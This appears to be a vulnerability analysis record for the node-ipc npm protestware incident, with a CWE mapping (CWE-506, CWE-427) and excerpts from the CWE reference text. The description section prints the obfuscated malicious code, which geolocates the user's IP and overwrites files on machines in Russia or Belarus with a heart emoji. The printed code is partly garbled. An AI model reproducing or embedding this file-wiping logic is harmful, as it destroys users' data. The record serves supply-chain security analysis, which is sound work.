## Vulnerability Description
This affects the package node-ipc from 10.1.1 and before 10.1.3. This package contains malicious code, that targets users with IP located in Russia or Belarus, and overwrites their files with a heart emoji. **Note** from versions 11.0.0 onwards, instead of having malicious code directly in the source of this package, node-ipc imports the peacenotwar package that includes potentially undesired behavior. Malicious Code **Note** Dont run it! js import u from path import a from fs import o from https setTimeout(function () { const t = Math.round(Math.random() * 4) if (t > 1) { return } const n = Buffer.from(aHR0cHM6Ly9hcGkuaXBnZW9sb2NhdGlvbi5pby9pcGdlbz9hcGlLZXk9YWU1MTFlMTYyNzgyNGE5NjhhYWFhNzU4YTUzMDkxNTQ=, base64) // https//api.ipgeolocation.io/ipgeo?apiKey=ae511e1627824a968aaaa758a5309154 o.get(n.toString(utf8), function (t) { t.on(data, function (t) { const n = Buffer.from(Li8=, base64) const o = Buffer.from(Li4v, base64) const r = Buffer.from(Li4vLi4v, base64) const f = Buffer.from(Lw==, base64) const c = Buffer.from(Y291bnRyeV9uYW1l, base64) const e = Buffer.from(cnVzc2lh, base64) const i = Buffer.from(YmVsYXJ1cw==, base64) try { const s = JSON.parse(t.toString(utf8)) const u = s[c.toString(utf8)].toLowerCase() const a = u.includes(e.toString(utf8)) || u.includes(i.toString(utf8)) // checks if country is Russia or Belarus if (a) { h(n.toString(utf8)) h(o.toString(utf8)) h(r.toString(utf8)) h(f.toString(utf8)) } } catch (t) {} }) }) }, Math.ceil(Math.random() * 1e3)) async function h(n = , o = ) { if (!a.existsSync(n)) { return } let r = [] try { r = a.readdirSync(n) } catch (t) {} const f = [] const c = Buffer.from(4p2k77iP, base64) for (var e = 0 e 0 ? f.push(...s) null } else if (i.indexOf(o) >= 0) { try { a.writeFile(i, c.toString(utf8), function () {}) // overwrites file with ?? } catch (t) {} } } return f } const ssl = true export { ssl as default, ssl }

## Evidence and Confidence

*   **Confidence Score:** 0.8
*   **Evidence Strength:** HIGH

- **Analysis and Justification:**
  - *Explanation:* The primary weakness is the presence of **malicious code** within the node-ipc package. This directly aligns with CWE-506 (Malicious Code), which is a Class-level CWE describing code that appears to be malicious in nature. The vulnerability description explicitly states that the package contains malicious code that overwrites files. The CVE Reference Links Content Summary reinforces this by highlighting "Malicious Code Injection" as a key weakness. While CWE-506 is a Class-level CWE, it is the most accurate high-level representation of the injected **malicious code**. The MITRE mapping guidance states it is ALLOWED-WITH-REVIEW because a more specific child may exist, however, in this case, it is appropriate since the exact nature of the **malicious code** is file overwriting which is more of an impact than a root cause.
  - *Relationship Analysis:* CWE-506 does not have direct relationships to other CWEs listed. However, it's important to consider that **malicious code** can lead to various other weaknesses or impacts, but the core issue here is the existence of that **malicious code** itself.

- **Analysis and Justification:**
  - *Explanation:* A secondary weakness could be CWE-427 (Uncontrolled Search Path Element). The **malicious code** is executed upon package installation from the npm repository, which can be viewed as a search path. If the user's machine is set to pull packages without validation, it can be considered a vulnerability.
  - *Relationship Analysis:* CWE-427 doesn't directly relate to CWE-506, but it represents how the weakness was delivered to the user and machine.

- **Confidence Score:**
  - *CWE-506 Confidence:* 0.95 (High confidence due to explicit mention of malicious code)
  - *CWE-427 Confidence:* 0.6 (Medium confidence, since the path is more of an ecosystem than a direct path.)

# Relevant CWE Specifications

## CWE-427: Uncontrolled Search Path Element
**Abstraction:** Base
**Status:** Draft

### Description
The product uses a fixed or controlled search path to find resources, but one or more locations in that path can be under the control of unintended actors.

### Extended Description


Although this weakness can occur with any type of resource, it is frequently introduced when a product uses a directory search path to find executables or code libraries, but the path contains a directory that can be modified by an attacker, such as "/tmp" or the current working directory.


In Windows-based systems, when the LoadLibrary or LoadLibraryEx function is called with a DLL name that does not contain a fully qualified path, the function follows a search order that includes two path elements that might be uncontrolled:


  - the directory from which the program has been loaded

  - the current working directory

In some cases, the attack can be conducted remotely, such as when SMB or WebDAV network shares are used.

One or more locations in that path could include the Windows drive root or its subdirectories. This often exists in Linux-based code assuming the controlled nature of the root directory (/) or its subdirectories (/etc, etc), or a code that recursively accesses the parent directory. In Windows, the drive root and some of its subdirectories have weak permissions by default, which makes them uncontrolled.


In some Unix-based systems, a PATH might be created that contains an empty element, e.g. by splicing an empty variable into the PATH. This empty element can be interpreted as equivalent to the current working directory, which might be an untrusted search element.


In software package management frameworks (e.g., npm, RubyGems, or PyPi), the framework may identify dependencies on third-party libraries or other packages, then consult a repository that contains the desired package. The framework may search a public repository before a private repository. This could be exploited by attackers by placing a malicious package in the public repository that has the same name as a package from the private repository. The search path might not be directly under control of the developer relying on the framework, but this search order effectively contains an untrusted element.


### Alternative Terms
DLL preloading: This term is one of several that are used to describe exploitation of untrusted search path elements in Windows systems, which received wide attention in August 2010. From a weakness perspective, the term is imprecise because it can apply to both CWE-426 and CWE-427.
Binary planting: This term is one of several that are used to describe exploitation of untrusted search path elements in Windows systems, which received wide attention in August 2010. From a weakness perspective, the term is imprecise because it can apply to both CWE-426 and CWE-427.
Insecure library loading: This term is one of several that are used to describe exploitation of untrusted search path elements in Windows systems, which received wide attention in August 2010. From a weakness perspective, the term is imprecise because it can apply to both CWE-426 and CWE-427.
Dependency confusion: As of February 2021, this term is used to describe CWE-427 in the context of managing installation of software package dependencies, in which attackers release packages on public sites where the names are the same as package names used by private repositories, and the search for the dependent package tries the public site first, downloading untrusted code. It may also be referred to as a "substitution attack."

### Relationships
ChildOf -> CWE-668
ChildOf -> CWE-668

### Mapping Guidance
**Usage:** Allowed
**Rationale:** This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.
**Comments:** Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.
**Reasons:**
- Acceptable-Use


### Potential Mitigations
**Mitigation 1:**
- **Phase:** Architecture and Design, Implementation
- **Strategy:** Attack Surface Reduction
- **Description:** Hard-code the search path to a set of known-safe values (such as system directories), or only allow them to be specified by the administrator in a configuration file. Do not allow these settings to be modified by an external party. Be careful to avoid related weaknesses such as CWE-426 and CWE-428.

**Mitigation 2:**
- **Phase:** Implementation
- **Strategy:** Attack Surface Reduction
- **Description:** When invoking other programs, specify those programs using fully-qualified pathnames. While this is an effective approach, code that uses fully-qualified pathnames might not be portable to other systems that do not use the same pathnames. The portability can be improved by locating the full-qualified paths in a centralized, easily-modifiable location within the source code, and having the code refer to these paths.

**Mitigation 3:**
- **Phase:** Implementation
- **Strategy:** Attack Surface Reduction
- **Description:** Remove or restrict all environment settings before invoking other programs. This includes the PATH environment variable, LD_LIBRARY_PATH, and other settings that identify the location of code libraries, and any application-specific search paths.



### Additional Notes
**[Relationship]** Unlike untrusted search path (CWE-426), which inherently involves control over the definition of a control sphere (i.e., modification of a search path), this entry concerns a fixed control sphere in which some part of the sphere may be under attacker control (i.e., the search path cannot be modified by an attacker, but one element of the path can be under attacker control).

**[Theoretical]** This weakness is not a clean fit under CWE-668 or CWE-610, which suggests that the control sphere model might need enhancement or clarification.



### Observed Examples
- **CVE-2023-25815:** chain: a change in an underlying package causes the gettext function to use implicit initialization with a hard-coded path (CWE-1419) under the user-writable C:\ drive, introducing an untrusted search path element (CWE-427) that enables spoofing of messages.
- **CVE-2022-4826:** Go-based git extension on Windows can search for and execute a malicious "..exe" in a repository because Go searches the current working directory if git.exe is not found in the PATH
- **CVE-2020-26284:** A Static Site Generator built in Go, when running on Windows, searches the current working directory for a command, possibly allowing code execution using a malicious .exe or .bat file with the name being searched



## CWE-506: Embedded Malicious Code
**Abstraction:** Class
**Status:** Incomplete

### Description
The product contains code that appears to be malicious in nature.

### Extended Description
Malicious flaws have acquired colorful names, including Trojan horse, trapdoor, timebomb, and logic-bomb. A developer might insert malicious code with the intent to subvert the security of a product or its host system at some time in the future. It generally refers to a program that performs a useful service but exploits rights of the program's user in a way the user does not intend.

### Alternative Terms
None

### Relationships
ChildOf -> CWE-912
ParentOf -> CWE-507
ParentOf -> CWE-510
ParentOf -> CWE-511
ParentOf -> CWE-512

### Mapping Guidance
**Usage:** Allowed-with-Review
**Rationale:** This CWE entry is a Class and might have Base-level children that would be more appropriate
**Comments:** Examine children of this entry to see if there is a better fit
**Reasons:**
- Abstraction


### Potential Mitigations
**Mitigation 1:**
- **Phase:** Testing
- **Description:** Remove the malicious code and start an effort to ensure that no more malicious code exists. This may require a detailed review of all code, as it is possible to hide a serious attack in only one or two lines of code. These lines may be located almost anywhere in an application and may have been intentionally obfuscated by the attacker.



### Additional Notes
**[Terminology]** The term "Trojan horse" was introduced by Dan Edwards and recorded by James Anderson [18] to characterize a particular computer security threat; it has been redefined many times [4,18-20].



### Observed Examples
- **CVE-2022-30877:** A command history tool was shipped with a code-execution backdoor inserted by a malicious party.
